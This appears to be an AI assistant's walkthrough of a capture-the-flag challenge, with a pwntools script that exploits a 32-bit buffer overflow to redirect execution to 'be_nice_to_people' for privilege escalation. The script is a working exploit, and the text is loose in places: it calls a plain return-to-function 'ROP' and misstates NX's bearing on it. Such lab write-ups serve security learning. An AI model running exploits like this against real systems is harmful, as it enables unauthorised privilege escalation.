To solve this challenge using `pwntools`, you need to exploit the buffer overflow in the `vulnerable_function` and use Return-Oriented Programming (ROP) to call the `be_nice_to_people` function, which sets the group ID. This will allow you to escalate your privileges. Here are the steps and the corresponding code to achieve this:

### Steps

1. **Analyze the Binary:**
   - The binary is a 32-bit ELF file.
   - The `vulnerable_function` reads 256 bytes into a 136-byte buffer, causing a buffer overflow.
   - The `be_nice_to_people` function sets the group ID, which can be used to escalate privileges.

2. **Find the Offset:**
   - Determine the offset at which the return address is overwritten by the buffer overflow.

3. **Find ROP Gadgets:**
   - Use `ROPgadget` or `pwntools` to find useful gadgets in the binary and the libc.

4. **Craft the Payload:**
   - Create a payload that overwrites the return address with the address of the `be_nice_to_people` function.

5. **Exploit the Buffer Overflow:**
   - Send the crafted payload to the binary to trigger the buffer overflow and execute the `be_nice_to_people` function.

### Code

Here is the Python script using `pwntools` to solve the challenge:

```python
from pwn import *

# Set up the process
elf = ELF('rop')
p = process(elf.path)

# Find the offset
offset = 136 + 4  # 136 bytes for the buffer + 4 bytes for the saved EBP

# Find the address of be_nice_to_people
be_nice_to_people_addr = elf.symbols['be_nice_to_people']

# Craft the payload
payload = b'A' * offset
payload += p32(be_nice_to_people_addr)

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()
```

### Explanation

1. **Set up the process:**
   - `elf = ELF('rop')`: Load the binary.
   - `p = process(elf.path)`: Start the process.

2. **Find the offset:**
   - The buffer size is 136 bytes, and the saved EBP takes 4 bytes. Therefore, the total offset to overwrite the return address is `136 + 4`.

3. **Find the address of `be_nice_to_people`:**
   - `be_nice_to_people_addr = elf.symbols['be_nice_to_people']`: Get the address of the `be_nice_to_people` function.

4. **Craft the payload:**
   - `payload = b'A' * offset`: Fill the buffer and the saved EBP with 'A's.
   - `payload += p32(be_nice_to_people_addr)`: Append the address of `be_nice_to_people` to overwrite the return address.

5. **Send the payload:**
   - `p.sendline(payload)`: Send the payload to the binary.

6. **Interact with the process:**
   - `p.interactive()`: Drop into an interactive shell to interact with the process.

### Additional Considerations

- **ASLR (Address Space Layout Randomization):**
  - If ASLR is enabled, you may need to leak a memory address to calculate the base address of the binary or libc.
- **NX (No-eXecute) Bit:**
  - If the NX bit is enabled, you cannot execute code on the stack. In this case, ROP is the way to go.

This script should work if the binary does not have ASLR or NX enabled. If these protections are enabled, you will need to adapt the script to handle them.
